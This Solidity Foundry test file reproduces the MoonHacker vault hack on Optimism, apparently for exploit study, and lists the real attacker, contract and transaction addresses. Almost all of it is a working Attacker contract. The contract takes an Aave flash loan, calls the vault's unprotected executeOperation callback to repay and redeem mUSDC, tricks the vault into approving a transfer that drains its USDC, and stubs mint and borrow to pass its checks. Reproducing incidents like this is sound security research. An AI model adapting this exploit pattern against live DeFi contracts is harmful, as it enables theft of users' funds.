// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.15;

import "../basetest.sol";
import "../interface.sol";

// @KeyInfo - Total Lost :  318.9 k
// Attacker : https://optimistic.etherscan.io/address/0x36491840ebcf040413003df9fb65b6bc9a181f52
// Attack Contract1 : https://optimistic.etherscan.io/address/0x4e258f1705822c2565d54ec8795d303fdf9f768e
// Attack Contract2 : https://optimistic.etherscan.io/address/0x3a6eaaf2b1b02ceb2da4a768cfeda86cff89b287
// Vulnerable Contract : https://optimistic.etherscan.io/address/0xd9b45e2c389b6ad55dd3631abc1de6f2d2229847
// Attack Tx : https://optimistic.etherscan.io/tx/0xd12016b25d7aef681ade3dc3c9d1a1cc12f35b2c99953ff0e0ee23a59454c4fe

// @Info
// Vulnerable Contract Code : https://optimistic.etherscan.io/address/0xd9b45e2c389b6ad55dd3631abc1de6f2d2229847#code (MoonHacker.sol)
// Mtoken code : https://optimistic.etherscan.io/address/0xA9CE0A4DE55791c5792B50531b18Befc30B09dcC#code (MToken.sol)
// Mtoken docs : https://docs.moonwell.fi/moonwell/developers/mtokens/contract-interactions

// @Analysis
// On-chain transaction analysis: https://app.blocksec.com/explorer/tx/optimism/0xd12016b25d7aef681ade3dc3c9d1a1cc12f35b2c99953ff0e0ee23a59454c4fe
// Post-mortem : https://blog.solidityscan.com/moonhacker-vault-hack-analysis-ab122cb226f6
// Twitter Guy : https://x.com/quillaudits_ai/status/1871607695700296041
// Hacking God : https://x.com/CertiKAlert/status/1871347300918030409

interface IMusdc {
    function borrowBalanceCurrent(address account) external returns (uint);
    function getAccountSnapshot(address account) external returns (uint, uint, uint, uint);
}

interface IMoonhacker {
    function executeOperation(
        address token,
        uint256 amountBorrowed,
        uint256 premium,
        address initiator,
        bytes calldata params
    ) external;
}

contract Moonhacker is BaseTestWithBalanceLog {
    uint256 blocknumToForkFrom = 129_697_251 - 1;
    IAaveFlashloan aaveV3 = IAaveFlashloan(0x794a61358D6845594F94dc1DB02A252b5b4814aD);
    IMusdc mUSDC = IMusdc(0x8E08617b0d66359D73Aa11E11017834C29155525);
    IMoonhacker moonhacker = IMoonhacker(0xD9B45e2c389b6Ad55dD3631AbC1de6F2D2229847);
    IERC20 USDC = IERC20(0x0b2C639c533813f4Aa9D7837CAf62653d097Ff85);

    function setUp() public {
        // You may need to change "optimism" to your own rpc url
        vm.createSelectFork("optimism", blocknumToForkFrom);

        fundingToken = address(USDC);

        vm.label(address(USDC), "USDC");
        vm.label(address(mUSDC), "mUSDC");
        vm.label(address(moonhacker), "moonhacker");
        vm.label(address(aaveV3), "AAVE V3");
    }

    function testExploit() public balanceLog {
        Attacker attacker = new Attacker();
        attacker.attack();
        attacker.getProfit();
    }
}

contract Attacker {
    IAaveFlashloan aaveV3 = IAaveFlashloan(0x794a61358D6845594F94dc1DB02A252b5b4814aD);
    IMusdc mUSDC = IMusdc(0x8E08617b0d66359D73Aa11E11017834C29155525);
    IMoonhacker moonhacker = IMoonhacker(0xD9B45e2c389b6Ad55dD3631AbC1de6F2D2229847);
    IERC20 USDC = IERC20(0x0b2C639c533813f4Aa9D7837CAf62653d097Ff85);

    function attack() public {
        // Start the flashloan
        aaveV3.flashLoanSimple(address(this), address(USDC), 883_917_967_954, new bytes(0), 0);
    }

    // Called back by AAVE V3
    function executeOperation(
        address asset,
        uint256 amount,
        uint256 premium,
        address initator,
        bytes calldata params
    ) external returns (bool) {
        // The actual exploit called 4 times
        for (uint i = 0; i < 4; i++) {
            redeem();
            returnFunds();
        }
        USDC.approve(address(aaveV3), amount + premium); // Approve AAVE V3 to repay the flashloan
        return true;
    }

    // Make moonhacker redeem USDC from mUSDC
    function redeem() public {
        // Accrue interest to updated borrowIndex and then calculate account's borrow balance using the updated borrowIndex
        uint256 borrowBalance = mUSDC.borrowBalanceCurrent(address(moonhacker));
        // Get moonhacker's mTokenBalance, borrowBalance, and exchangeRateMantissa
        (, uint256 mTokenBalance,,) = mUSDC.getAccountSnapshot(address(moonhacker));
        // Give moonhacker USDC to repay
        USDC.transfer(address(moonhacker), borrowBalance);

        uint8 operationType = 1; // REDEEM
        bytes memory encodedRedeemParams = abi.encode(operationType, address(mUSDC), mTokenBalance);

        // IERC20(token).approve(mToken, amountBorrowed) => IERC20(USDC).approve(mUSDC, borrowBalance);
        // IMToken(mToken).repayBorrow(amountBorrowed) => IMToken(mUSDC).repayBorrow(borrowBalance)
        // IMToken(mToken).redeem(amountToSupplyOrReedem) => IMToken(mUSDC).redeem(mTokenBalance)
        // Get more USDC back by repaying and redeeming
        moonhacker.executeOperation(address(USDC), borrowBalance, 0, address(this), encodedRedeemParams);
    }

    // Get back the USDC from moonhacker to attacker contract
    function returnFunds() public {
        uint256 moonhackerUSDCBalance = USDC.balanceOf(address(moonhacker));
        uint8 operationType = 0; // SUPPLY
        bytes memory encodedReturnParams = abi.encode(operationType, address(this), 0);

        // IERC20(token).approve(mToken, totalSupplyAmount);
        // IERC20(USDC).approve(address(this), moonhackerUSDCBalance);
        // Approve USDC to attacker contract
        moonhacker.executeOperation(address(USDC), moonhackerUSDCBalance, 0, address(this), encodedReturnParams);
        
        USDC.transferFrom(address(moonhacker), address(this), moonhackerUSDCBalance);
    }

    // Cheat moonhacker to pass the check (SUPPLY part)
    function mint(uint256 amount) public pure returns (uint8) {
        return 0;
    }

    // Cheat moonhacker to pass the check (SUPPLY part)
    function borrow(uint256 amount) public pure returns (uint8) {
        return 0;
    }

    function getProfit() public{
        uint256 profit = USDC.balanceOf(address(this));
        USDC.transfer(msg.sender, profit);
    }
}